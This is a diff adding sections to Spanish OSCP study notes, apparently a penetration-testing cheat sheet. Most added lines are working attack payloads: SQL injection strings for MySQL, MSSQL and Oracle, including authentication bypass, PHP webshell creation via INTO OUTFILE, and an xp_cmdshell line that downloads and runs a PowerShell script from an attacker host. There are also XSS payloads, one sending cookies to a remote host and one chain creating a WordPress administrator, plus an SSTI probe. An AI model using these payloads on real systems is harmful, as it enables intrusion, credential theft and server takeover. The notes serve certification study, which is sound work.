@@ -10,6 +10,7 @@ Apuntes para la certificación OSCP.
     * 1.1. [Linux](#linux)
         * 1.1.1. [Crunch](#crunch)
         * 1.1.2. [Escapar de una Restricted Shell](#escapar-de-una-restricted-shell)
+        * 1.1.3. [Configuración de Fecha y Hora](#configuración-de-fecha-y-hora)
     * 1.2. [Windows](#windows)
         * 1.2.1. [Habilitar WinRM](#habilitar-winrm)
         * 1.2.2. [ Habilitar RDP](#-habilitar-rdp)
@@ -82,6 +83,21 @@ Apuntes para la certificación OSCP.
         * 5.2.3. [Drupal](#drupal)
         * 5.2.4. [Magento](#magento)
     * 5.3. [Local File Inclusion (LFI)](#local-file-inclusion-(lfi))
+    * 5.4. [SQL Injection](#sql-injection)
+        * 5.4.1. [MySQL](#mysql)
+        * 5.4.2. [MSSQL](#mssql)
+        * 5.4.3. [Oracle SQL](#oracle-sql)
+        * 5.4.4. [Error-based SQL Injection (SQLi)](#error-based-sql-injection-(sqli))
+        * 5.4.5. [UNION-based SQL Injection (SQLi)](#union-based-sql-injection-(sqli))
+        * 5.4.6. [SQL Truncation Attack](#sql-truncation-attack)
+    * 5.5. [Cross-Site Scripting (XSS)](#cross-site-scripting-(xss))
+        * 5.5.1. [Petición vía Ajax - GET](#petición-vía-ajax---get)
+        * 5.5.2. [Petición vía Ajax - POST](#petición-vía-ajax---post)
+        * 5.5.3. [Comprimir script](#comprimir-script)
+    * 5.6. [XML External Entity (XXE)](#xml-external-entity-(xxe))
+    * 5.7. [Server-Side Request Forgery (SSRF)](#server-side-request-forgery-(ssrf))
+    * 5.8. [Server-Side Template Injection (SSTI)](#server-side-template-injection-(ssti))
+        * 5.8.1. [Magic Payload](#magic-payload)
 * 6. [Pivoting](#pivoting)
     * 6.1. [Chisel](#chisel)
         * 6.1.1. [Servidor (Atacante)](#servidor-(atacante))
@@ -240,6 +256,23 @@ exec "/bin/sh"
 
 # Lua
 os.execute('/bin/sh')
+```
+
+####  1.1.3. <a name='configuración-de-fecha-y-hora'></a>Configuración de Fecha y Hora
+
+```bash
+sudo net time -c <RHOST>
+sudo net time set -S <RHOST>
+sudo net time \\<RHOST> /set /y
+sudo ntpdate <RHOST>
+sudo ntpdate -s <RHOST>
+sudo ntpdate -b -u <RHOST>
+sudo timedatectl set-timezone UTC
+sudo timedatectl list-timezones
+sudo timedatectl set-timezone '<COUNTRY>/<CITY>'
+sudo timedatectl set-time 15:58:30
+sudo timedatectl set-time '2015-11-20 16:14:50'
+sudo timedatectl set-local-rtc 1
 ```
 
 ###  1.2. <a name='windows'></a>Windows
@@ -1178,6 +1211,248 @@ droopescan scan drupal -u http://<RHOST> -t 32
 php magescan.phar scan:all http://<RHOST>
 ```
 ###  5.3. <a name='local-file-inclusion-(lfi)'></a>Local File Inclusion (LFI)
+###  5.4. <a name='sql-injection'></a>SQL Injection
+
+####  5.4.1. <a name='mysql'></a>MySQL
+
+##### Obtener el número de columnas
+
+```sql
+-1 ORDER BY 3;#
+-1 ORDER BY 3;--1-
+```
+
+##### Obtener la versión
+```sql
+-1 UNION SELECT 1,VERSION(),3;#
+```
+##### Obtener el nombre de la base de datos en uso
+
+```sql
+-1 UNION SELECT 1,DATABASE(),3;#
+```
+
+##### Obtener nombre de las tablas
+
+```sql
+-1 UNION SELECT 1,2, GROUP_CONCAT(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA="<DATABASE>";#
+```
+
+##### Obtener el nombre de las columnas
+
+```sql
+-1 UNION SELECT 1,2, GROUP_CONCAT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA="<DATABASE>" AND TABLE_NAME="<TABLE>";#
+```
+
+##### Leer un archivo
+
+```sql
+SELECT LOAD_FILE('/etc/passwd')
+```
+
+##### Dump Data
+
+```sql
+-1 UNION SELECT 1,2, GROUP_CONCAT(<COLUMN>) FROM <DATABASE>.<TABLE>;#
+```
+
+##### Crear una Webshell
+
+```sql
+LOAD_FILE('/etc/httpd/conf/httpd.conf')
+SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/html/<FILE>.php";
+```
+
+```sql
+LOAD_FILE('/etc/httpd/conf/httpd.conf')
+' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/<FILE>.php" -- //
+```
+
+####  5.4.2. <a name='mssql'></a>MSSQL
+
+##### Bypass de Autenticación
+
+```sql
+' or 1=1--
+```
+
+##### Obtener la versión con una Time-Based Injection
+
+```sql
+' SELECT @@version; WAITFOR DELAY '00:00:10'; —
+```
+
+##### Habilitar xp_cmdshell
+
+```sql
+' UNION SELECT 1, null; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
+```
+##### Ejeecución Remota de Comandos (RCE)
+
+```sql
+' exec xp_cmdshell "powershell IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/<FILE>.ps1')" ;--
+```
+
+####  5.4.3. <a name='oracle-sql'></a>Oracle SQL
+
+##### Bypass de Autenticación
+
+```sql
+' or 1=1--
+```
+
+##### Obtener el número de columnas
+
+```sql
+' order by 3--
+```
+
+##### Obtener el nombre de la tabla
+
+```sql
+' union select null,table_name,null from all_tables--
+```
+
+##### Obtener el nombre de la columna
+
+```sql
+' union select null,column_name,null from all_tab_columns where table_name='<TABLE>'--
+```
+
+##### Dump Data
+
+```sql
+' union select null,PASSWORD||USER_ID||USER_NAME,null from WEB_USERS--
+```
+
+####  5.4.4. <a name='error-based-sql-injection-(sqli)'></a>Error-based SQL Injection (SQLi)
+
+
+```sql
+<USERNAME>' OR 1=1 -- //
+```
+
+Genera la siguiente consulta
+
+```sql
+SELECT * FROM users WHERE user_name= '<USERNAME>' OR 1=1 --
+```
+
+```sql
+' or 1=1 in (select @@version) -- //
+' OR 1=1 in (SELECT * FROM users) -- //
+' or 1=1 in (SELECT password FROM users) -- //
+' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
+```
+
+####  5.4.5. <a name='union-based-sql-injection-(sqli)'></a>UNION-based SQL Injection (SQLi)
+
+> https://d4redevil.gitbook.io/d4redevil/owasp-top-10-y-vulnerabilidades-web/inyecciones-sql/inyecciones-sql-basada-en-uniones
+
+##### Inyección SQL manual - Pasos
+
+```sql
+$query = "SELECT * FROM customers WHERE name LIKE '".$_POST["search"]."%'";
+```
+
+```sql
+' ORDER BY 1-- //
+```
+
+```sql
+%' UNION SELECT database(), user(), @@version, null, null -- //
+```
+
+```sql
+%' UNION SELECT database(), user(), @@version, null, null -- //
+```
+
+```sql
+' UNION SELECT null, null, database(), user(), @@version  -- //
+```
+
+```sql
+' UNION SELECT null, table_name, column_name, table_schema, null FROM information_schema.columns WHERE table_schema=database() -- //
+```
+
+```sql
+' UNION SELECT null, username, password, description, null FROM users -- //
+```
+
+##### Blind SQL Injection (SQLi)
+
+> https://d4redevil.gitbook.io/d4redevil/owasp-top-10-y-vulnerabilidades-web/inyecciones-sql/inyecciones-sql-basadas-en-booleanos
+
+```sql
+http://<RHOST>/index.php?user=<USERNAME>' AND 1=1 -- //
+```
+
+```sql
+http://<RHOST>/index.php?user=<USERNAME>' AND 1=1 -- //
+```
+
+####  5.4.6. <a name='sql-truncation-attack'></a>SQL Truncation Attack
+
+```bash
+'admin@<FQDN>' = 'admin@<FQDN>++++++++++++++++++++++++++++++++++++++htb'
+```
+
+###  5.5. <a name='cross-site-scripting-(xss)'></a>Cross-Site Scripting (XSS)
+
+```html
+<sCrIpt>alert(1)</ScRipt>
+<script>alert('XSS');</script>
+<script>alert(document.cookies)</script>
+<script>document.querySelector('#foobar-title').textContent = '<TEXT>'</script>
+<script>fetch('https://<RHOST>/steal?cookie=' + btoa(document.cookie));</script>
+<script>user.changeEmail('user@domain');</script>
+<iframe src=file:///etc/passwd height=1000px width=1000px></iframe>
+<img src='http://<RHOST>'/>
+```
+
+####  5.5.1. <a name='petición-vía-ajax---get'></a>Petición vía Ajax - GET
+
+```javascript
+var ajaxRequest = new XMLHttpRequest();
+var requestURL = "/wp-admin/user-new.php";
+var nonceRegex = /ser" value="([^"]*?)"/g;
+ajaxRequest.open("GET", requestURL, false);
+ajaxRequest.send();
+var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
+var nonce = nonceMatch[1];
+```
+
+####  5.5.2. <a name='petición-vía-ajax---post'></a>Petición vía Ajax - POST
+```javascript
+var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=<USERNAME>&email=<EMAIL>&pass1=<PASSWORD>&pass2=<PASSWORD>&role=administrator";
+ajaxRequest = new XMLHttpRequest();
+ajaxRequest.open("POST", requestURL, true);
+ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+ajaxRequest.send(params);
+```
+
+####  5.5.3. <a name='comprimir-script'></a>Comprimir script
+
+> https://jscompress.com/
+
+```javascript
+var params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=<USERNAME>&email=<EMAIL>&pass1=<PASSWORD>&pass2=<PASSWORD>&role=administrator";ajaxRequest=new XMLHttpRequest,ajaxRequest.open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);
+```
+
+
+###  5.6. <a name='xml-external-entity-(xxe)'></a>XML External Entity (XXE)
+###  5.7. <a name='server-side-request-forgery-(ssrf)'></a>Server-Side Request Forgery (SSRF)
+###  5.8. <a name='server-side-template-injection-(ssti)'></a>Server-Side Template Injection (SSTI)
+
+```bash
+http://<RHOST>/index.php?view=<RHOST>://shell.php
+```
+
+####  5.8.1. <a name='magic-payload'></a>Magic Payload
+
+```bash
+{{ ‘’.__class__.__mro__[1].__subclasses__() }}
+```
 
 ##  6. <a name='pivoting'></a>Pivoting
 
